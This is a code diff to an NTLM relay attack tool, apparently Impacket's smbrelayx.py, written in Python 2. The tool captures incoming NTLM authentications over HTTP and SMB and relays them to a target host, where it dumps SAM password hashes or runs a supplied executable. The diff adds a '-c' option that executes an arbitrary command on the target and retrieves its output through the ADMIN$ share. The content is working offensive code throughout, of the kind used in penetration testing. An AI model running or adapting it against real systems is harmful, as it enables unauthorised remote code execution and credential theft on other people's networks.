@@ -59,7 +59,7 @@ except Exception:
     logging.critical("See http://www.pycrypto.org/")
 
 class doAttack(Thread):
-    def __init__(self, SMBClient, exeFile):
+    def __init__(self, SMBClient, exeFile, command):
         Thread.__init__(self)
 
         if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
@@ -68,9 +68,13 @@ class doAttack(Thread):
             self.__SMBConnection = SMBClient
 
         self.__exeFile = exeFile
+        self.__command = command
+        self.__answerTMP = ''
         if exeFile is not None:
             self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
 
+    def __answer(self, data):
+        self.__answerTMP += data
 
     def run(self):
         # Here PUT YOUR CODE!
@@ -92,11 +96,19 @@ class doAttack(Thread):
 
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
-                bootKey = remoteOps.getBootKey()
-                samFileName = remoteOps.saveSAM()
-                samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                samHashes.dump()
-                logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                if self.__command is not None:
+                    remoteOps._RemoteOperations__executeRemote(self.__command)
+                    logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
+                    self.__answerTMP = ''
+                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                    print self.__answerTMP
+                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                else:
+                    bootKey = remoteOps.getBootKey()
+                    samFileName = remoteOps.saveSAM()
+                    samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                    samHashes.dump()
+                    logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception, e:
                 logging.error(str(e))
             finally:
@@ -378,9 +390,10 @@ class SMBClient(smb.SMB):
 
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
-        def __init__(self, server_address, RequestHandlerClass, target, exeFile, mode, outputFile):
+        def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile):
             self.target = target
             self.exeFile = exeFile
+            self.command = command
             self.mode = mode
             self.outputFile = outputFile
 
@@ -475,7 +488,7 @@ class HTTPRelayServer(Thread):
                     if self.server.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.outputFile)
 
-                    clientThread = doAttack(self.client,self.server.exeFile)
+                    clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                     clientThread.start()
                     # And answer 404 not found
                     self.send_response(404)
@@ -492,6 +505,7 @@ class HTTPRelayServer(Thread):
         self.machineAccount = None
         self.machineHashes = None
         self.exeFile = None
+        self.command = None
         self.target = None
         self.mode = None
         self.outputFile = outputFile
@@ -501,6 +515,9 @@ class HTTPRelayServer(Thread):
 
     def setExeFile(self, filename):
         self.exeFile = filename
+
+    def setCommand(self, command):
+        self.command = command
 
     def setMode(self,mode):
         self.mode = mode
@@ -512,7 +529,7 @@ class HTTPRelayServer(Thread):
 
     def run(self):
         logging.info("Setting up HTTP Server")
-        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode, self.outputFile)
+        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode, self.outputFile)
         httpd.serve_forever()
 
 class SMBRelayServer(Thread):
@@ -526,6 +543,7 @@ class SMBRelayServer(Thread):
         self.machineAccount = None
         self.machineHashes = None
         self.exeFile = None
+        self.command = None
 
         # Here we write a mini config for the server
         smbConfig = ConfigParser.ConfigParser()
@@ -702,7 +720,7 @@ class SMBRelayServer(Thread):
                     if self.server.getJTRdumpPath() != '':
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                     del (smbData[self.target])
-                    clientThread = doAttack(smbClient,self.exeFile)
+                    clientThread = doAttack(smbClient,self.exeFile,self.command)
                     clientThread.start()
                     # Now continue with the server
                 #############################################################
@@ -766,7 +784,7 @@ class SMBRelayServer(Thread):
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                 del (smbData[self.target])
-                clientThread = doAttack(smbClient,self.exeFile)
+                clientThread = doAttack(smbClient,self.exeFile,self.command)
                 clientThread.start()
                 # Remove the target server from our connection list, the work is done
                 # Now continue with the server
@@ -807,6 +825,9 @@ class SMBRelayServer(Thread):
     def setExeFile(self, filename):
         self.exeFile = filename
 
+    def setCommand(self, command):
+        self.command = command
+
     def setMode(self,mode):
         self.mode = mode
 
@@ -825,7 +846,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
     parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
-    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes would will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
     parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
@@ -852,11 +874,13 @@ if __name__ == '__main__':
         mode = 'REFLECTION'
 
     exeFile = options.e
+    Command = options.c
 
     for server in RELAY_SERVERS:
         s = server(options.outputfile)
         s.setTargets(targetSystem)
         s.setExeFile(exeFile)
+        s.setCommand(Command)
         s.setMode(mode)
         if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
             s.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
